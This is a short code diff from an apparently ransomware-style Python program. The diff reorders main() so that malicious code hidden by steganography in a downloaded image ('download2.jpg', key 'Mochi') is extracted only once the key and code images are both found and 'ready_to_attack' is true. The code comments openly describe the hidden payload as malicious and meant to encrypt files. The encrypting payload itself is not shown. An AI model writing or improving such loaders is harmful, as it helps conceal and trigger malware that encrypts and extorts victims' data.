@@ -3,9 +3,6 @@ from extract import extract_message
 
 
 def main():
-    # Retrieves malicious code secretly embedded in one of the images
-    code_to_encrypt_files: str = extract_message("download2.jpg", "Mochi")
-
     # Represents the name of the two images to be scanned for in the downloads directory
     image_containing_key: str = "download.jpg"
     image_containing_code: str = "download2.jpg"
@@ -31,6 +28,9 @@ def main():
 
     # Determines whether both the key and code were found
     ready_to_attack: bool = key_found and code_found
+
+    # Retrieves malicious code secretly embedded in one of the images
+    code_to_encrypt_files: str = extract_message(image_containing_code, "Mochi")
 
     # Have to keep looking for them at all times until both are found
     while not ready_to_attack:
